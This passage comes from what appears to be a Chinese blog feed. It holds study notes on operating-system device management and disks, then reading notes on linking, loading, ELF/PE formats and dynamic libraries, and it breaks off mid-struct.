title="设备独立性"></a>设备独立性</h4><p>设备分配：根据用户的I/O请求分配所需要的设备</p><ul><li><p>相关数据结构如下（以Linux为例子）</p><ul><li>设备控制表DCT：每个设备都有，其中包括设备类型、标识符、状态、相关指针等信息</li><li>控制器控制表COCT：一个设备控制器对应一个，OS根据此表信息对控制器进行操作管理</li><li>通道控制表CHCT：照应前面的通道控制方式，一个通道对应一个表</li><li>系统设备表SDT：整个系统只有一个，记录所有的已连接的设备情况</li><li>逻辑设备表LUT：用于将逻辑设备名映射为物理设备名。可以在系统中共用一张，也可以每个用户一张表</li></ul></li><li><p>分配算法：FCFS、最高优先级</p></li><li><p>分配步骤：</p><ol><li><p>进程根据逻辑设备名查找LUT中对应物理设备名，并根据系统API发送请求</p></li><li><p>根据I/O请求中的物理设备名查找SDT，找到DCT，得知设备状态</p></li><li><p>设备分配后，根据DCT找到COCT查询控制器状态</p></li><li><p>控制器分配后，根据COCT找到CHCT查询通道状态，不忙则分配，之后便开始数据传输</p></li></ol></li></ul><p>设备驱动程序接口：即常说的驱动，是I/O系统的上层与设备控制器之间的通信程序。基本功能如下：</p><ul><li>接收上层软件的命令参数，并将其转换为对设备的具体操作</li><li>检查I/O请求合法性，传递与设备操作有关的参数</li><li>发出I/O命令，设备空闲则启动，忙则将进程PCB挂载</li><li>及时响应设备控制器的中断请求，并据此调用相应中断处理程序</li></ul><p>SPOOLing技术/假脱机技术：为了缓和CPU高速和I/O设备低速的矛盾，并非具体的硬件，而是软件实现。大致思想是，在磁盘中建立输入井&amp;输出井，在内存中构建输入/输出缓冲区，以此来实现CPU与I/O设备之间的数据传输</p><h4 id="磁盘与固态硬盘"><a href="#磁盘与固态硬盘" class="headerlink" title="磁盘与固态硬盘"></a>磁盘与固态硬盘</h4><p>磁盘管理</p><ul><li>磁盘初始化：也叫低级格式化，对于空白盘，经此初始化后将其分为区，分区由头部、数据区域、尾部组成</li><li>磁盘分区：分区后，每个区都需要一个文件系统，这步也叫高级格式化，用于在分区中装入初始文件系统数据结构</li><li>磁盘引导块：由自举程序初始化CPU，寄存器等，并找到操作系统内核将其加载至内存。这个程序一般很小，在启动分区上</li></ul><p>磁盘调度算法</p><ul><li>先来先服务FCFS：根据访问磁盘的先后顺序查找</li><li>最短寻道时间有限SSTF：在当前位置，哪个请求的代价最小（最近）就先找谁</li><li>扫描算法SCAN：先顺着某个方向走到头之后，在更换方向去访问剩下的</li><li>循环扫描C-SCAN：先访问到向右访问到最右端，之后跳到最左端开始向右访问</li></ul><p>磁盘优化：磁盘会转，而且读入后需要一定时间处理，因此可以给扇区交错编号；采用磁盘高速缓存；提前读与延迟写；优化数据块的分布；磁盘阵列RAID。</p><p>固态硬盘SSD：由一个或多个闪存芯片和闪存翻译层构成，闪存芯片由许多块构成，块由页构成，页是数据的读写的基本单位，但在一定次数的读写后就会损坏。为了弥补页上的这种磨损，可采用动态/静态磨损均衡，前者在写时自动优先写新的，后者则是自动监测进行分配</p>]]></content>
      
      
      <categories>
          
          <category> 考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 408 </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《程序员自我修养——链接、装载与库》读书笔记</title>
      <link href="/2024/01/31/%E7%BC%96%E9%93%BE%E8%A3%85/"/>
      <url>/2024/01/31/%E7%BC%96%E9%93%BE%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="计算机体系简介"><a href="#计算机体系简介" class="headerlink" title="计算机体系简介"></a>计算机体系简介</h3><p>从下向上：硬件—操作系统—运行时库—应用程序，其中间交互的作用的就是接口，仅下对上，可以理解为一个中间层，用于对下面那层的包装和扩展。</p><ul><li><p>运行时库提供给应用程序：应用程序编程接口API。什么样的运行时库提供什么样的API，Linux下Glibc库提供的符合POSIX标准的API，Windows运行库提供的Windows API</p></li><li><p>运行时库使用OS提供的：系统调用接口。其实现往往以软件中断提供，Linux中的0x80号中断，windows传统的0x2E中断（新的CPU有32位<code>sysenter</code>指令与64位<code>syscall</code>快速调用）<a href="https://bbs.kanxue.com/thread-223023.htm">Windows系统调用</a></p><p>系统调用原理：系统调用一般都运行在内核态，os通过中断来从用户态切换到内核态。根据接收到的中断号跑到中断向量表中查询，拿到指针后跳转到对应的中断处理程序。</p></li><li><p>硬件与OS之间有硬件规格，由硬件生产厂商提供，之后由操作系统与驱动程序开发者根据硬件规格通过硬件编程接口标准来编写OS和驱动程序</p><blockquote><p>驱动程序可以视为OS的一部分，跟操作系统一样运行在特权级，驱动等于是对硬件的抽象，使得开发者能够忽视具体硬件细节而能借助统一的操纵实现对不同硬件的操控。一般来说由OS厂商提供一系列接口和框架，之后由硬件生产厂商按照这些标准来为自己的硬件设备开发驱动程序。</p></blockquote></li></ul><p>进程线程与任务：</p><ul><li><p>在Windows中标准的线程与进程，每个线程中私有的内容有：局部变量、函数的参数、TLS（线程局部存储）数据；线程之间共享的内容：全局变量、堆上的数据、函数里面的静态变量、程序代码。Windows中有专门的API可以操作进程与线程，也有<code>SetThreadPriority()</code>来设置线程优先级</p></li><li><p>在Linux中，并不存在进程与线程的区别，都作为任务运行（一种单线程的进程），不同的任务之间可以选择共享内存空间，因此也在某种意义上构成了线程。</p></li></ul><h3 id="如何从代码到程序"><a href="#如何从代码到程序" class="headerlink" title="如何从代码到程序"></a>如何从代码到程序</h3><p>从HelloWorld源代码到“hello world!”：首先编写hello.c源代码，之后经过预处理器对源代码文件进行简单替换得到hello.i，进入到编译器进行编译（最复杂的一部分）得到中间代码hello.s，之后再由汇编器进行简单的替换生成可以重定位的代码hello.o，最后借助链接器将需要的库与我们的文件绑定在一起生成hello.out，点击执行由装载器把程序所需内容放入内存，最后在屏幕上显示“hello world！”。</p><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><ul><li>所有的<code>#define</code>删除并展开，处理条件预编译指令<code>#if</code>等，将<code>#include</code>包含的文件插入到预编译指令的位置</li><li>删除注释，添加行号与文件名标识（便于编译器处理）</li><li>保留所有的<code>#pragma</code>编译器指令，用来告诉编译器特定操作</li></ul><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>主要包括</p><p>编译器结构：词法分析器\得到符号流——语法分析器\语法树——语义分析器\语法树——中间代码生成器\中间表示——代码优化器\优化中间表示——代码生成器\目标机器语言，上述所有过程都可能要与符号表管理程序、错误检查和处理程序打交道。</p><blockquote><p>符号表：记录源程序的变量名字、属性信息包括存储分配、类型、作用域等、参数数量、返回类型</p></blockquote><p>这里我们简单说明一下：词法分析—语法分析—语义分析—代码生成—目标代码优化这几个步骤</p><ul><li><p>词法分析：又叫扫描，源代码被输入到扫描器中，使用一种有限状态机算法产生词法单元（token）<code>&lt;token_name,attritube_value&gt;</code>作为输出，并将标识符存储到符号表，数字字符串等放到文字表。<code>lex</code>程序可以实现此功能。</p><blockquote><p>第一个是抽象出来的对象，当作id就可，后面的指的是在符号表中对应的位置，<code>&lt;id,1&gt;</code>就是指的比如变量<code>a</code>，在程序中第几个出现后面数字就是几。</p></blockquote></li><li><p>语法分析：又叫解析，语法分析器对上面的词法单元采用上下文无关语法分析产生语法树（其他的还可以有BNF范式）。<code>yacc</code>工具</p><blockquote><p>语法树包括传统的与AST（抽象语法分析树）,传统语法分析树的只有根节点是词法单元，其他节点均为<code>表达式</code>，而在AST中，符号作为非叶子结点，变量等作为叶子节点。</p></blockquote></li><li><p>语义分析：由语义分析器执行静态语义（即编译期间可以确定的语义）分析，包括声明和类型匹配转换等。此后会对语法树作出相应的插入调整，并给表达式表示类型</p></li><li><p>中间代码生成：将语法树转换为中间代码，常见的有：三地址码、P-代码。也是从这里开始，可以将编译器分为前后端，前端负责产生无关机器的中间代码，后端负责将中间代码转换成目标机器代码。</p></li><li><p>目标代码生成与优化：包括代码生成器和目标代码优化器，前者将中间代码转换成目标机器代码（高度依赖于目标机器）。之后再由目标代码优化器进行优化，比如选择合适的寻址方式、使用位移来代替乘法运算、删除多余的指令等。</p></li></ul><p><strong>编译器的前后端</strong>：由源程序得到中间代码的部分叫，编译器的前端，主要与源语言有关；中间代码到目标机器语言部分叫，后端，主要与目标语言/机器有关。借助前后端分离可以更方便地移植代码</p><p><strong>编译器分类</strong>：一趟/一遍，就是读入并产生一个输出，前端可以是一趟，后端可以是一趟；当然合起来也可以只有一趟，这样的编译器叫做单趟扫描编译程序，否则叫做多趟扫描编译程序</p><p><strong>编译器编写方式</strong>：机器语言+汇编；高级语言（例如py解释器）；自编译方式+自展；编译程序产生器</p><blockquote><p>自编译程序：最基本的用机器等编写，之后再以该底层函数基本库，编写其他更高级的东西；自展即在前者基础上滚雪球，用L0写L1，再用L1写L2等。</p></blockquote><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>将会汇编代码转换为机器可以执行的指令，简单理解为就是查对照表替换。此时的.o（对应win下的.obj文件）文件从结构上来说和可执行文件一样，但是有些地址没有确定，因此也暂且叫做目标文件</p><ul><li><code>as hello.s -o hello.o</code>或<code>gcc -c hello.s -o hello.o</code>或<code>gcc -c hello.c -o hello.o</code></li></ul><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>将用到的.o文件全部都放在一起，确定前面所说的地址信息。因为即使是<code>printf()</code>，我们自己并没有实现，而操作系统中有相应的库根据系统API已经实现好了，这一步需要的就是让我们的程序拿到这个库中的函数实现</p><p>在Windows/Linux下的可执行文件【.exe&amp;.out】、目标文件【.obj&amp;.o】、动态链接库【.dll&amp;.so】、静态链接库【.lib&amp;.a】都是按照可执行文格式存储，分别按照PE-COFF格式和ELF格式</p><blockquote><p>在Linux中.a和.o被归为可重定位文件。无论是PE还是ELF都是基于COFF格式发展过来的。</p></blockquote><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><p>人机交互的API，在c语言中其<code>printf</code>函数在Linux上最终来到<code>write</code>系统调用，在win上来到<code>WriteConsole</code>系统API。静态链接库则用于程序和机器之间交互，这个库就是对上面所说的API的包装。所谓的库可以理解为一堆提前写好的API的.o文件的打包，在Linux下用<code>ar</code>来打包或者查看.a，对应win下的<code>lib.exe</code></p><blockquote><p>通常来说库中的每个目标文件只有自己的一个函数实现，主要用于减少额外空间浪费</p></blockquote><h4 id="什么是符号"><a href="#什么是符号" class="headerlink" title="什么是符号"></a>什么是符号</h4><p>为了方便说明，我们需要改变一下对变量和函数名称的概念理解：</p><ul><li><p>符号：符号都是一个内容的别名，通过符号我们可以方便设计，而不用去关心具体变量或函数在哪个位置。变量和函数就是符号，函数名或变量名就是符号名。链接就是将存在于不同模块（文件）中的符号互相拼接起来的操作。</p></li><li><p>符号表：每个目标文件都会有一个相应的符号表，每个定义的符号都有一个对应的值，也就是地址。除了变量和函数，那些全局符号(global)、引用的外部符号(extern)、段名、行号等信息都可以在符号表中</p></li><li><p>特殊符号：当使用ld时会自动产生，<code>executable_start</code>程序起始地址、<code>__etext</code>代码段结束地址、<code>_edata</code>数据段结束地址、<code>_end</code>程序结束地址。</p></li></ul><h4 id="链接的过程"><a href="#链接的过程" class="headerlink" title="链接的过程"></a>链接的过程</h4><p>地址和空间分配、符号决议/符号绑定/名称绑定、重定位（修正之前代码中的目标地址，这个要修改的位置也叫做重定位入口）等。因此静态链接也就是常说的链接时重定位</p><blockquote><p><code>ld a.o b.o -e main -o ab</code>(-e指定程序入口，默认<code>_start</code>，修改的就是ELF文件头的e_entry项)。</p></blockquote><ul><li><p>空间地址分配：扫描所有的输入文件，将各个段进行合并（还有各个目标文件的符号表合成一张全局符号表），并计算长度与位置建立映射关系。在形成最终文件之前，目标文件内各段的VMA虚拟地址一般为0，合并之后由链接器分配相应虚拟地址（Linux下ELF可执行文件默认从0x08048000开始分配）</p></li><li><p>符号解析与重定位：读取文件中段的信息，进行符号解析、重定位计算、调整代码地址等。例如在目标文件中，一般都使用偏移定位，在这步由于上面已经给定了各段的虚拟地址，于是乎变量函数等的偏移地址会改为虚拟地址</p><blockquote><p>链接器通过重定位表来中的内容来更改相应的地址，<code>objdump -r a.o</code>查看重定位表</p></blockquote></li></ul><ul><li><p>符号重定义问题：</p><ul><li><p>为了防止库中的符号与程序编写的符号冲突，C语言源文件代码中的全局变量和函数经过编译后会在相应的符号前加上下划线“_”（windows下保存，Linux下没有此机制），与此类似作用的还有CPP中的命名空间。</p></li><li><p>关于不同目标文件中符号重复定义的问题：编译器默认函数和初始化的全局变量都是强符号，未初始化的全局变量为弱符号。gcc下<code>__attritube__((weak))</code>可以用来改为弱符号</p><ul><li>强符号在不同的目标文件中不能有同名，多个强符号则会报错</li><li>在多个目标文件中，有强则强，全弱则选占空间最大的</li></ul></li></ul></li><li><p>链接过程中的外部引用问题：强引用如果没有找到该符号则报错，对于弱引用如果没有该定义则不报错<code>__attritube__((weakref))</code>。一般作用于库，使得程序可以使用自己定义的相关函数</p></li></ul><h4 id="如何控制链接过程"><a href="#如何控制链接过程" class="headerlink" title="如何控制链接过程"></a>如何控制链接过程</h4><p>一般来说链接器会有默认的链接规则对目标文件进行链接，但是在开发OS、驱动等东西时，则需要我们自己亲自指定相关的规则，包括但不限于：使用哪些文件、输出文件的格式、段的有关信息等。一般有以下三种方法：</p><ul><li>命令行给定参数</li><li>链接指令存放在目标文件里（编译器常用操作）</li><li>链接控制脚本（<code>ld -verbose</code>查看默认链接脚本，<code>usr/lib/ldscripts/</code>下存储）</li></ul><p>因为修改编译器和链接器成本是巨大的，而目前在用的ELF变种较多（也包括大小端与位数），因此出现了BFD库。GCC与链接器还有<a href="https://blog.csdn.net/A642960662/article/details/123078067">Binutils</a>工具集等通过BFD库来进一步分析不同变种的ELF格式，也就省去了修改编译器等的工作。</p><h3 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h3><p>所谓装载就是程序变成进程的过程，也就将磁盘中不会动的程序，放到内存中让它变成执行ing的进程，为此在内存中也需要有空间留给OS和用户进程。以32位CPU为例子，寻址空间4GB，在Linux中按照1-3分，1GB留给操作系统，剩下的3GB留到进程空间中；windows则是默认2-2，可以在Boot.ini下修改。</p><blockquote><p>硬件上来说，Intel后面修改了处理器的页映射方式，32位地址线扩展至36位，这种扩展方式也被叫做PAE。对于操作系统来说，一般都是需要用到时再交换进去，理解为交换区。对应windows下的AWE与Linux下的mmap机制</p></blockquote><h4 id="装载入内存的方法"><a href="#装载入内存的方法" class="headerlink" title="装载入内存的方法"></a>装载入内存的方法</h4><ul><li><p>静态装入：不多bb，直接梭哈全都放内存</p></li><li><p>动态装入：最常用的部分驻留在内存中，不太常用的放在磁盘里面。经典的有覆盖装入和页映射</p><ul><li><p>覆盖装入：常用于虚拟存储出现之前。将内存分布的工作交给开发者，开发者通过编写一个“覆盖管理器”，来管理其他模块应该何时驻留在内存中，何时被替换掉。</p><blockquote><p>栗子：模块A与B互不干扰，因此在需要A的时候分配A的大小并调入内存，需要B时再将B调入到原有的A的空间即可。复杂的需要采取树状管理（禁止跨树调用、调用路径上的模块必须都在内存中）</p></blockquote></li><li><p>页映射：伴随着虚拟内存而出现，内存、磁盘都按照页为单位分配。也就是OS中说到的页面置换算法，因为分配的内存已满而又需要从外部调入数据，因此需要选择一个页进行替换。</p><blockquote><p>常见的算法：OPT最佳置换算法、FIFO先进先出算法、LRU最近最少使用算法、LFU最少使用置换算法、PBA页面缓冲算法</p></blockquote></li></ul></li></ul><h4 id="装载过程"><a href="#装载过程" class="headerlink" title="装载过程"></a>装载过程</h4><ul><li><p>创建独立的虚拟地址空间：在32位Linux下分配一个页目录即可，实现的是物理内存与虚拟空间之间的映射</p></li><li><p>读取可执行文件头，并建立虚拟空间与可执行文件的映射关系：在系统创建进程/任务时，会有专门的内核空间中的结构体对该程序的虚拟空间做记录，记录程序中段的偏移与其应该加载到内存中的位置</p><blockquote><p>这一块块虚拟内存空间在Linux下叫做虚拟内存<strong>区域</strong>VMA，Windows中叫做虚拟段。特别强调，这个结构体属于OS的内存管理，并非可执行文件的段页头表</p></blockquote></li><li><p>将CPU的指令寄存器设置成可执行文件的入口地址：涉及内核堆栈与用户堆栈的切换以及CPU执行权限等的切换，将可执行文件头中的程序入口地址载入即可</p></li><li><p>页错误：此时对应空间地址有了，但是该空间下并没有内容，也就是引发页错误。于是根据第二步的数据结构，计算代码段在文件中的位置，之后将其加载到内存对应位置上。最后权限返回给进程开始执行。</p></li></ul><p><strong>链接与执行视图</strong>：根据上面页错误过程，因为交换时都是以4KB为单位的，不可能每一个段都这么分配，于是在装载到内存的时候，部分属性相同的段会被放在一起，比如根据可读可执行、可读可写、只读段，之后按照这种属性将其都分配到同一个VMA中，也就是为什么有段，节之分。</p><blockquote><p>这里不对”Section”和”Segment”做区分，段和节换着用，内容理解即可。<code>readelf -S xxx.elf</code>读取文件的节区头表（程序时）。<code>readelf -l xxx.elf</code>读取文件的程序头表（运行时）</p></blockquote><p>在真正装载到内存之后，还有其他的VMA/虚拟段（由于不存在于文件中，需要加个”匿名的“前缀）被分配用来作为程序的堆栈，以及与操作系统的交流空间（Linux下的vdso区-内核空间）</p><h4 id="Linux内核装载ELF文件"><a href="#Linux内核装载ELF文件" class="headerlink" title="Linux内核装载ELF文件"></a>Linux内核装载ELF文件</h4><ol><li><p>终端bash中输入命令，用户层面bash进程调用fork()创建一个新进程，新进程调用execve()系统调用执行指定的ELF文件，原先的父bash返回等待输入</p></li><li><p>exeve调用后进入到内核，其入口是<code>sys_execve()</code>用于检查参数。之后来到<code>do_execve()</code>，首先查找被执行文件并读取前128字节。</p><blockquote><p>ELF：0x7E、E、L、F。Java：c、a、f、e。脚本：#!/bin/sh、#!/usr/bin/python</p></blockquote></li><li><p>之后根据读取到的文件头调用<code>search_bnary_handler()</code>来查找相应可执行文件的装载处理过程</p><blockquote><p>ELF文件<code>load_binary_handle()</code>；Unix下的a.out文件<code>load_aout_binary()</code>；脚本程序<code>load_script()</code></p></blockquote></li><li><p><code>load_elf_binary()</code>：首先对文件头检查，之后寻找动态链接的.interp段设置动态连接器路径，接下来根据其文件描述对ELF文件进行映射，然后初始化ELF进程环境，最后将系统调用返回地址修改为可执行文件的入口点</p><blockquote><p>对于入口点，静态链接的话指的就是ELF文件头中的e_entry；动态链接的话就是动态链接器</p></blockquote></li><li><p>第四步执行完后返回到<code>do_execve()</code>再返回到<code>sys_execve()</code>，从内核态变回用户态，EIP寄存器跳转到了ELF程序入口地址，新程序执行。</p></li></ol><h4 id="Windows装载PE文件"><a href="#Windows装载PE文件" class="headerlink" title="Windows装载PE文件"></a>Windows装载PE文件</h4><p>由于PE文件中有RVA、VA等概念，所以PE文件可以装载到任意位置。此外相比于ELF来说PE文件的段较少，也就没有所谓的段和节的概念，而是在内存中尽可能的合并</p><ol><li>读取文件第一个页，其中包含了DOS头、NT头和段表</li><li>检查进程地址空间中目标地址是否可用，不可用则另选一个装载地址。</li><li>根据段表信息将PE中的段映射到地址空间中</li><li>装载地址如果不是目标地址则Rebasing</li><li>装载所需dll</li><li>对PE文件中的导入符号进行解析</li><li>根据PE头指定的参数建立初始化堆栈</li><li>建立主线程并启动进程</li></ol><h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>前面我们介绍了静态链接，他有如下几个缺点：内存中多个进程都要用到相同的代码，也就是静态链接了同一个文件到多个进程中；静态库更新成本巨大。于是有了动态链接，所谓的动态就是将链接过程放在了装载时进行。</p><blockquote><p>通俗来讲就是装载主模块的时候再将目标文件装载到内存中并由动态链接器链接，供给一个或者多个进程使用。插件一般都是这么来的，也完美诠释了模块化的思想。</p></blockquote><p>Linux下ELF动态链接文件称为“动态共享对象”/“共享对象”一般以.so结尾。在windows中被叫做动态链接库.dll。Linux下glibc的动态链接形式在/lib下的<code>libc.so</code></p><p>当然因为需要在装载时额外开费时间装载动态链接库，因此性能上会稍有下降。</p><h4 id="Linux下动态链接"><a href="#Linux下动态链接" class="headerlink" title="Linux下动态链接"></a>Linux下动态链接</h4><p><code>gcc -shared</code>用于指定输出为共享对象。需要注意的是，虽然是在主程序装载时，才需要链接该共享对象，但是在编译生成主程序时依然需要指定共享对象，否则编译器无法知道其中的外部函数究竟怎么操作<code>gcc -o xx a.c ./b.so</code>，so库中含有完整的符号信息</p><blockquote><p>静态链接库中的函数则需要重定位；动态链接库中的函数则对相应符号做一个动态链接的标记，暂时不重定位，装载时再进行</p></blockquote><p>在主程序运行时，除了上述共享对象外，还会有<code>ld.so</code>—动态链接器的存在。运行主模块之前系统会先将控制权交给<code>ld.so</code>，其在内存中随机地址装载共享对象，完成所有工作后返回控制权给主模块。</p><blockquote><p>动态链接器不一定是<code>ld.so</code>，ELF的.interp段可以决定，该段就是个字符串用于存放链接器路径。在Linux中这个东西还可以直接执行，因为结构和可执行文件类似，而内核也只是按照程序头表里的描述装载执行。windows下同理<code>rundll32.exe</code>就可以将一个DLL当做可执行文件运行</p></blockquote><p><strong>动态链接步骤</strong></p><ul><li><p>动态链接器自举：ld本身不能使用任何其他共享对象，其次ld本身所需全局和静态变量的重定位工作自己完成，且不能调用函数</p><blockquote><p>以自举代码开始，首先找到自身的GOT，并借此获取.dynamic段的信息，之后获得ld的重定位表和符号表，从而完成自身的重定位</p></blockquote></li><li><p>装载共享对象：共享对象被装载时，他的符号表会被合并到全局符号表中。一般采用广搜来装载共享对象，如果有符号相同的（共享对象全局符号介入），则在符号表中以第一个符号为准</p></li><li><p>重定位和初始化：重新遍历所有的重定位表，将GOT/PLT中需要重定位的位置进行修正。接下来ld执行共享对象中的.init段来实现其特有的初始化过程，进程的.init由程序自己执行</p></li></ul><p><strong>ELF有关段</strong></p><ul><li>.dynamic段保存了依赖哪些共享对象、动态链接符号表位置、重定位表的位置、共享对象的初始化代码地址等。结构如下，由前面类型值决定后面含义。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;Elf32_Dyn;</span><br></pre></td></tr></table></figure><ul><li><p>.dynsym动态链接符号表，其中只存放了与动态链接相关的符号；</p><p>.symtab符号表则是保存了所有符号；</p><p>.strtab是静态链接时的符号字符串表；</p><p>.dynstr则是动态链接符号字符串表；</p><p>.hash即符号哈希表，为了加快查找过程；</p></li><li><p>静态链接中有专门的重定位段，.rel.text表示代码段的重定位表，.rel.data表示数据段的重定位表。</p><p>动态链接中，.rel.dyn是对数据引用的修正，修正的东西位于.got和数据段，.rel.plt是对函数引用的修正，修正的东西位于.got.plt</p></li></ul><p>链接时重定位：多用于静态链接中，链接时固定虚拟内存地址</p><p>装载时重定位：装载时发现目标位置有东西，再额外更换地方（win下叫做地址重置）</p><p>装载时重定位目前有个问题，就是对于那些需要修改地址的东西不方便，当A进程需要用共享对象S时，A是和S关联的，也就是地址上相联系，此时的B进程就用不了捏。</p><p><strong>PIC地址无关代码</strong></p><p>基本思想是将需要修改的部分分离出来与数据部分放置在一起，这样对于不同的进程来说就可以有一个单独的副本进行操作。也就解决了上面说的一个共享对象不能共享</p><p>在gcc下<code>-fPIC</code>用于为共享对象设置，也可以用于可执行文件<code>-fpie</code>（比装载时重定位更慢）</p><blockquote><p>GCC判断一个so是否用了PIC技术——没有<code>TEXTREL</code>即代码重定位</p></blockquote><ul><li><p>本共享模块内部的函数调用：相对地址调用即可</p></li><li><p>模块内数据调用：数据必定在代码后，只要相对于当前指令的地址加上固定的偏移量就可以访问模块内部数据了</p></li><li><p>模块间的数据访问：主进程数据段中建立一个GOT表（全局偏移表），用于指向副本中的这些共享数据</p><blockquote><p>GOT表在装载时可以修改，每个进程都有独特的一份。模块间指的是一个内共享对象的多个模块或者是多个共享对象内部的多个模块</p></blockquote></li><li><p>与其他模块间的函数调用：同上也在GOT表中</p></li></ul><blockquote><p>VC中的<code>__declspec(dllimport)</code>就是用来表示一个符号是模块内部还是模块外部</p></blockquote><p><strong>延迟绑定PLT</strong>：用于提高动态链接效率，就是当函数被使用时才去进行符号查找、重定位。有一个PLT表，每个函数都有一个对应的项（Key为函数指针），这个函数在第一次执行时，通过压入目标符号在重定位表中的下标&amp;模块ID，之后调用<code>_dl_runtime_resolve()</code>来将目标符号的真正地址填入到GOT表中，之后再次执行该函数因为就会根据GOT表项跳转到相应目标函数位置</p><p><strong>显式运行时链接</strong>：一种特殊的动态链接，也叫运行时加载，顾名思义就是需要时再由程序本身在运行时根据需要借助动态链接器的相关API来实现动态装载库的装载与卸载等工作。</p><blockquote><p>打开动态库<code>dlopen</code>、关闭动态库<code>dlclose</code>；头文件<code>&lt;dlfcn.h&gt;</code></p></blockquote><p><strong>动态库查找顺序</strong>：</p><ol><li>.dynamic中有指定绝对路径</li><li>查找有环境变量<code>LD_LIBRARY_PATH</code>指定的一系列目录</li><li>由<code>/etc/ld.so.cache</code>指定的共享库路径</li><li>先<code>/lib</code>-系统关键共享库，后<code>/usr/lib</code>-非系统关键共享库最后<code>/use/local/lib</code>-与系统无关共享库</li></ol><p><strong>共享对象的版本号</strong>：<code>ooxx.so.x.y.z</code>【x-主版本号-有重大升级；y-次版本号-库的增量升级；z-发布版本号-错误修正等】</p><blockquote><p> SO-NAME即只保留主版本号，因为Linux中对共享对象采用软连接，由此可以方便连接到更高版本来兼容低版本。当系统更新共享库时<code>ldconfig</code>来更新所有的软链接，并更新<code>ld.so.cache</code></p></blockquote><p>操作：</p><ul><li><code>gcc -shared -fPIC -Wl,-soname,libooxx.so.1 -o libooxx.so.1.0.0 linoo.c libxx.c</code></li><li><code>ld -rpath /home/mylib -o ooxx.out ooxx.o -lsomelib</code>指定共享库</li><li><code>strip libooxx.so</code>去掉符号信息，ld的<code>-s</code>，<code>-S</code>参数，gcc的<code>-Wl，-s</code>和<code>-Wl,-S</code></li><li><code>ldconfig -n shared_lib_dir</code>指定共享库位置</li></ul><h4 id="Windows下动态链接"><a href="#Windows下动态链接" class="headerlink" title="Windows下动态链接"></a>Windows下动态链接</h4><p>DLL即动态链接库，其扩展名不一定是.dll，.ocx或.cpl都是一种DLL文件，与EXE文件一样都是PE格式文件。在win下DLL常用于运行时加载，相关WINAPI：<code>LoadLibrary</code>、<code>GetProcAddress</code>、<code>FreeLibrary</code></p><p><strong>有关概念</strong></p><ul><li>基地址：PE文件被装载时，其进程空间的起始地址，ImageBase，EXE默认0x400000；DLL默认0x10000000</li><li>相对地址：当基地址有东西时，PE装载器就会选用其他空闲地址。也就有了RVA，即相对于基地址的偏移</li></ul><p><strong>dll生成</strong>：编译生成DLL文件时，会生成<code>xx.obj xx.dll xx.lib xx.exp</code>，</p><ul><li>其中的lib用于描述dll的导出符号，后缀是静态链接库，但本身不包含实际代码，只是对dll的符号说明，也因此叫做导入库。</li><li>exp文件是第一遍扫描时产生的全局符号表，但是以标准PE格式存在，之后第二遍再与其他目标文件链接形成dll</li></ul><p><strong>PE有关节</strong></p><ul><li><p>引出函数节.edata：一般在DLL中，本文件向其他文件提供的可调用函数列表。导出表指向三个重要内容，导出地址表EAT、符号名表、名字序号对应表。名字序号对应表项数和符号名表相同，一个名字对应一个序号，当使用函数名作为导入导出方式时，动态链接器首先根据目标符号在符号名表中的位置，将其作为下标查找名字序号对应表，之后减去dll的默认序号Base值（一般都是1）得到EAT目标地址下标。</p><blockquote><p>仅供内部使用的导出函数只有序号没有函数名。而且因为序号容易改变，一般不借助序号导入</p></blockquote></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br><span class="line">     DWORD   Characteristics;<span class="comment">//属性，一般为0</span></span><br><span class="line">     DWORD   TimeDateStamp;<span class="comment">//文件生成时间戳</span></span><br><span class="line">     WORD    MajorVersion;<span class="comment">//主版本号</span></span><br><span class="line">     WORD    MinorVersion;<span class="comment">//次版本号</span></span><br><span class="line">     DWORD   Name;<span class="comment">//指向的DLL名字</span></span><br><span class="line">     DWORD   Base;<span class="comment">//导出函数的起始序列号，与下面的序号y相加得到对应函数的导出序号</span></span><br><span class="line">     DWORD   NumberOfFunctions;<span class="comment">//所有导出函数的总数</span></span><br><span class="line">     DWORD   NumberOfNames;<span class="comment">//有名称的导出函数总数，都有序号</span></span><br><span class="line">     DWORD   AddressOfFunctions;     <span class="comment">//指向函数地址数组，每个成员占4B，表示相应函数的RVA</span></span><br><span class="line">     DWORD   AddressOfNames;         <span class="comment">//指向一个数组，里面装的是4B的地址，该地址下存放的是函数名字字符串，借此数组与我们需要的函数名称进行对比，我们可以找到目标的序号x</span></span><br><span class="line">     DWORD   AddressOfNameOrdinals;  <span class="comment">//指向一个序号对应数组，由上面的序号x，查找得到需要的函数地址在AddressOfFunction中的序号y</span></span><br><span class="line"> &#125; IMAGE_EXPORT_DIRECTORY, 